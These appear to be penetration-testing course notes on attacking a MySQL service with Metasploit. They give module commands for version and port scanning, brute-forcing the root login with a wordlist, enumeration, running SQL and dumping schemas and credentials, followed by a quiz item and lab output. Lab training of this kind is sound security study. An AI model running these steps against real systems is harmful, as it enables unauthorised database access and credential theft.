- Relational Database Management System
- Port 3306


Get MySQL Version 
```
search type:auxiliary name:mysql
use auxiliary/scanner/mysql/mysql_version
options
exploit
```

Get Port MySQL is running on
```
search auxiliary name:portscan
use auxiliary/scanner/portscan/tcp
options
exploit
```

Brute Force MySQL Login
```
search mysql_login
use auxiliary/scanner/mysql/mysql_login
options
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE true
set STOP_ON_SUCCESS true
exploit
```

Enumerate MySQL 
Need credentials of the admin user before running the scan
```
search mysql_enum 
use auxiliary/admin/mysql/mysql_enum
options 
set PASSWORD <password>
set USERNAME admin
exploit
```

Interact with MySQL Service
show all databases
```
search mysql_sql
use auxiliary/admin/mysql/mysql_sql
options
set PASSWORD <password>
set USERNAME <username>
set SQL show databases; 
exploit
```

View all databases
```
search mysql_schema
use auxiliary/scanner/mysql/mysql_schemadump 
options
set USERNAME <username>
set PASSWORD <password>
exploit
```

View credentials from postgresql database
```
creds
loot
```

## Quiz

What MySQL auxiliary module can be used to execute authenticated SQL queries on a MySQL database server?

	auxiliary/admin/mysql/mysql_sql
## Lab

```
192.66.29.3
```


- auxiliary/admin/mysql/mysql_enum
```

```

- auxiliary/admin/mysql/mysql_sql
```

```

- auxiliary/scanner/mysql/mysql_file_enum
```

```
  
- auxiliary/scanner/mysql/mysql_hashdump
```

```
  
- auxiliary/scanner/mysql/mysql_login
```

```
  
- auxiliary/scanner/mysql/mysql_schemadump
```

```
  
- auxiliary/scanner/mysql/mysql_version
```
192.66.29.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
```
  
- auxiliary/scanner/mysql/mysql_writable_dirs
```

```